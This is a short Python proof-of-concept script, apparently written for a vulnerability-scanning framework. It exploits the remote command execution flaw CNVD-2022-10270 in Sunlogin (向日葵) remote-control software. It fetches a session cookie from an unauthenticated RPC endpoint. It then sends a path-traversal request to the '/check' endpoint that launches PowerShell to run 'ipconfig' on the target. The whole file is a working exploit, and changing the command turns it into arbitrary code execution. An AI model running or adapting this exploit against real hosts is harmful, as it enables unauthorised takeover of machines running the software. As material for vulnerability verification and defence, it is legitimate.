# title: 向日葵 check 远程命令执行漏洞
# cve-id: CNVD-2022-10270
# author: jgz
# body="Verification failure"

from poctools import BasicPoc
import requests
import json


class Poc(BasicPoc):
    def __init__(self):
        super(Poc, self).__init__()
        self.name = ""
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Aoyou/biEzMm5kNDRrWTcgazFsTEFTYejkYHK-l5UHLC1JPOhy_B1sefJvAsiTZA=='}
        self.timeout = 20

    def verify(self, url: str) -> bool:
        target = url.strip("/")
        target_1 = f'{target}/cgi-bin/rpc?action=verify-haras'
        target_2 = f'{target}/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+ipconfig'
        try:
            response_1 = requests.get(target_1, headers=self.headers, timeout=self.timeout, verify=False)
            if response_1.status_code == 200:
                cookie = json.loads(response_1.text)["verify_string"]
                self.headers["Cookie"] = "CID=" + cookie
                print(self.headers)
                response_2 = requests.get(target_2, headers=self.headers, verify=False, timeout=10)
                print(response_2.text)
                if response_2.status_code == 200 and "255.255.255" in response_2.text:
                    # print(response_2.text)
                    return True
        except Exception as err:
            pass
        return False


if __name__ == '__main__':
    url = "http://127.0.0.1:49669"
    poc = Poc()
    result = poc.run(url)
    print(f"{url} -> {result}")
